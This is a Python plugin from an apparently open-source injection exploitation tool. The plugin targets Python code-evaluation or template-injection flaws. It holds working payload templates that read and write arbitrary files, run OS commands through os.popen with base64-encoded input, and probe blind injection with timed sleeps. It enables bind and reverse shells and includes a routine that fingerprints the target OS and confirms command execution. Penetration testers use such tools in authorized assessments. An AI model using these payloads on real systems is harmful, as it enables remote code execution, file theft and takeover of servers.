from utils.strings import quote
from core.plugin import Plugin
from core import languages
from utils.loggers import log
from utils import rand
import base64
import re

class Python(Plugin):

    actions = {
        'render' : {
            'render': """str(%(code)s)""",
            'header': """'%(header)s'+""",
            'trailer': """+'%(trailer)s'"""
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk_b64)s'))""",
            'truncate' : """open("%(path)s", 'w').close()"""
        },
        'read' : {
            'call': 'evaluate',
            'read' : """__import__("base64").b64encode(open("%(path)s", "rb").read())"""
        },
        'md5' : {
            'call': 'evaluate',
            'md5': """__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest()"""
        },
        'evaluate' : {
            'call': 'inject',
            'evaluate': """%(code)s"""
        },
        'execute' : {
            'call': 'evaluate',
            'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()"""
        },
        'blind' : {
            'call': 'evaluate_blind',
            'bool_true' : """'a'.join('ab') == 'aab'""",
            'bool_false' : 'True == False'
        },
        'evaluate_blind' : {
            'call': 'evaluate',
            'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('%(code_b64)s')) and __import__('time').sleep(%(delay)i)"""
        },
        'bind_shell' : {
            'call' : 'execute_blind',
            'bind_shell': languages.bash_bind_shell
        },
        'reverse_shell' : {
            'call': 'execute_blind',
            'reverse_shell' : languages.bash_reverse_shell
        },
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s') + ' && sleep %(delay)i').read()"""
        },
    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },

    ]

    language = 'python'

    def rendered_detected(self):

        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)

        payload = '"%s".join("%s")' % (randA, randB)
        expected = randA.join(randB)

        if expected == self.render(payload):

            self.set('engine', self.plugin.lower())
            self.set('language', self.language)

            os = self.evaluate("""'-'.join([__import__('os').name, __import__('sys').platform])""")
            if os and re.search('^[\w-]+$', os):
                self.set('os', os)
                self.set('evaluate', self.language)
                self.set('write', True)
                self.set('read', True)

                expected_rand = str(rand.randint_n(2))
                if expected_rand == self.execute('echo %s' % expected_rand):
                    self.set('execute', True)
                    self.set('bind_shell', True)
                    self.set('reverse_shell', True)


    def blind_detected(self):

        self.set('engine', self.plugin.lower())
        self.set('language', self.language)

        # Blind has been detected so code has been already evaluated
        self.set('evaluate_blind', self.language)

        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
            self.set('execute_blind', True)
            self.set('write', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)
